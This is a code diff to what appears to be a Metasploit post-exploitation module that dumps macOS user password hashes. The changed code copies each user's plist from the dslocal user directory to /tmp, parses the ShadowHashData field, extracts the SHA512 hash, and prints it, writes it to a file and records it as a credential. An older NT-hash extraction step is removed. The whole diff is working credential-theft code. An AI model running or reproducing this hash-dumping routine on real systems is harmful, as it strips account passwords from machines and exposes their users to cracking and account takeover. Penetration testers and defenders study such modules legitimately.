@@ -59,6 +59,35 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
+	#parse the dslocal plist in lion
+	def read_ds_xml_plist(plist_content)
+
+		require "rexml/document"
+
+		doc  = REXML::Document.new(plist_content)
+		keys = []
+
+		doc.elements.each("plist/dict/key") do |element|
+			keys << element.text
+		end
+
+		fields = {}
+		i = 0
+		doc.elements.each("plist/dict/array") do |element|
+			data = []
+			fields[keys[i]] = data
+			element.each_element("*") do |thing|
+				data_set = thing.text
+				if data_set
+					data << data_set.gsub("\n\t\t","")
+				else
+					data << data_set
+				end
+			end
+			i+=1
+		end
+		return fields
+	end
 	# Function for creating the folder for gathered data
 	def log_folder_create(log_path = nil)
 		#Get hostname
@@ -162,14 +191,16 @@ class Metasploit3 < Msf::Post
 						cmd_exec("cp /private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
 						cmd_exec("plutil -convert xml1 /tmp/#{p.chomp}")
 						file = cmd_exec("cat /tmp/#{p.chomp}")
-						doc = REXML::Document.new(file)
-						hash_text = doc.elements.to_a("///array")[2].elements["data"].text.gsub("\n\t\t","")
-						hash_text.unpack('m')[0].each_byte do |b|
+						plist_values = read_ds_xml_plist(file)
+						
+						plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
 							hash_decoded << sprintf("%02X", b)
 						end
-						user = p.scan(/(\S*)\.plist/)
-						sha512 = hash_decoded.slice(104..213)
-						nt_hash = hash_decoded.slice(214..249)
+						user = plist_values['name']
+						hashes = hash_decoded.gsub(/^\w*1044/,"")
+
+						sha512 = hashes.slice(0..135)
+
 
 						print_status("SHA512:#{user}:#{sha512}")
 						file_local_write(sha1_file,"#{user}:#{sha512}")
@@ -182,23 +213,10 @@ class Metasploit3 < Msf::Post
 							:active => false
 						)
 
-						if nt_hash !~ /000000000000000/
-							print_status("NT:#{user}:#{nt_hash}")
-							file_local_write(nt_file,"#{user}:#{nt_hash}")
-							report_auth_info(
-								:host   => host,
-								:port   => 445,
-								:sname  => 'smb',
-								:user   => user,
-								:pass   => nt_hash,
-								:active => true
-							)
-						end
+						hash_decoded = ""
 					end
 				end
 				return
-
-
 			end
 
 			# Extract the hashes
